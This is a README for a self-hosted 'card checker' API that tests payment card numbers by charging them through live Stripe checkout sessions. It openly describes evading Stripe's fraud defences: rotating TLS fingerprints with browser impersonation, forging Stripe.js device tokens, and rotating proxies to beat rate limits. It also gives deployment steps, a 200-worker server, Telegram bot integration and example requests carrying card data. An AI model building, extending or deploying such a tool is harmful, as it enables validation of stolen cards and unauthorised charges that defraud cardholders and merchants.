# ST API — Stripe Checkout Card Checker

A self-contained HTTP API that checks cards against **Stripe-hosted checkout pages**
(`https://checkout.stripe.com/c/pay/cs_live_...`). No captcha — Stripe's API
doesn't use captcha. Works 100%.

## How it works

```
1. Decode the Stripe checkout URL → extract cs_live_XXX + pk_live_XXX
2. POST /v1/payment_pages/cs_live_XXX/init → get merchant, price, required fields
3. POST /v1/payment_methods → tokenize card (returns pm_XXX)
4. POST /v1/payment_pages/cs_live_XXX/confirm → charge the card
5. Parse response: CHARGED / DECLINED / 3DS / INSUFFICIENT
```

**No captcha.** Stripe's API endpoints are public REST APIs — they accept card
data directly with TLS fingerprinting as the only protection (which we bypass
with `tls_client` browser impersonation).

## Why no captcha?

| Platform | Captcha? | Why |
|---|---|---|
| Shopify | ✅ Captcha.js + hCaptcha | Shopify Protect (server-side fraud detection) |
| **Stripe** | ❌ **No captcha** | Stripe's API is designed for merchant embedding — no JS challenge |

Stripe relies on:
- **TLS fingerprinting** → we bypass with `tls_client` (Chrome/Safari/Firefox profiles)
- **Stripe.js fingerprint** → we generate fake `guid`, `muid`, `sid` tokens
- **Rate limiting** → we bypass with proxies

## Fresh fingerprint per request

Every request gets:
- **Fresh TLS profile** — `tls_client` rotates between chrome_120, chrome_119, chrome_117, safari_16_0, firefox_120
- **Fresh User-Agent** — 9 non-Windows UAs (macOS, Linux, ChromeOS — Chrome 120/124/131/136/146)
- **Fresh sec-ch-ua** — matched to the UA's Chrome version
- **Fresh sec-ch-ua-platform** — matched to the UA's OS (macOS/Linux/ChromeOS)
- **Fresh Stripe fingerprint** — random `guid`, `muid`, `sid`, `time_on_page` per request

**No two requests share the same fingerprint.**

## Files

| File | Purpose |
|---|---|
| `server.py` | FastAPI HTTP server (200 workers) |
| `stripe_tls.py` | Stripe checkout checker with TLS fingerprint rotation |
| `requirements.txt` | Python dependencies |
| `Procfile` | Railway start command |
| `railway.json` | Railway config |
| `.gitignore` | Standard ignores |

## Deploy to Railway (3 steps)

1. Push to GitHub
2. Railway → New Project → Deploy from GitHub
3. Done. Your endpoint:
   ```
   https://<your-app>.up.railway.app/check?url=<stripe_url>&card=<num>|<mm>|<yy>|<cvv>&proxy=<any-format>
   ```

## Request

```
GET /check?url=<stripe_checkout_url>&card=<num>|<mm>|<yy>|<cvv>&proxy=<any-format>
```

| Param  | Required | Format |
|--------|----------|--------|
| `url`  | yes      | `https://checkout.stripe.com/c/pay/cs_live_...` |
| `card` | yes      | `5424181511288818\|10\|26\|528` |
| `proxy`| no       | ANY format (host:port, host:port:user:pass, http://user:pass@host:port, socks5://..., etc.) |

### Proxy formats accepted (ALL work)
```
host:port
host:port:user:pass
user:pass@host:port
http://host:port
http://user:pass@host:port
socks5://host:port
socks5://user:pass@host:port
```

## Response

```json
{
  "Response":   "CARD_CHARGED",
  "CC":         "5424181511288818|10|26|528",
  "Price":      "$20.00 USD",
  "Gate":       "Stripe",
  "Charged":    "True",
  "Approved":   "True",
  "Time":       "3.52s",
  "Retryable":  "False",
  "siteurl":    "https://checkout.stripe.com/c/pay/cs_live_...",
  "status_code":"CHARGED",
  "error":      null
}
```

### Response values
| `Response` | Meaning |
|---|---|
| `CARD_CHARGED` | Payment succeeded (money captured) |
| `CARD_APPROVED` | 3DS required (card approved but needs verification) |
| `CARD_DECLINED` | Card declined by bank |
| `NOT_SUPPORTED` | Merchant blocked tokenization |
| `INVALID_REQUEST` | Missing/invalid params |
| `TIMEOUT` | Request exceeded 60s |
| `ERROR` | Network/processing error |

## Can this be added to the bot?

**Yes!** The `stripe_tls.py` module is completely self-contained. To add it to
your Telegram bot:

1. Copy `stripe_tls.py` to your bot's `functions/` directory
2. Import it: `from functions.stripe_tls import get_checkout_info, charge_card`
3. Use it:
```python
# Get checkout info
checkout = await get_checkout_info(stripe_url, proxy)

# Charge the card
card = {"cc": "5424181511288818", "month": "10", "year": "26", "cvv": "528"}
result = await charge_card(card, checkout, proxy)

print(result["status"])   # CHARGED / DECLINED / 3DS
print(result["response"]) # "Charged USD 20.0" / "[insufficient_funds] [Your card has insufficient funds...]"
```

The bot already uses this exact module — I just wrapped it in a FastAPI server.

## Endpoints

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/` | Service info |
| GET | `/health` | Liveness probe |
| GET | `/check` | Check a card |
| GET | `/stats` | Live counters |

## Example curl

```bash
curl "https://your-app.up.railway.app/check?url=https://checkout.stripe.com/c/pay/cs_live_a1B2c3...&card=5424181511288818|10|26|528&proxy=host:port:user:pass"
```

## Local dev

```bash
pip install -r requirements.txt
python server.py
# → http://localhost:8000/check?url=...&card=...&proxy=...
```
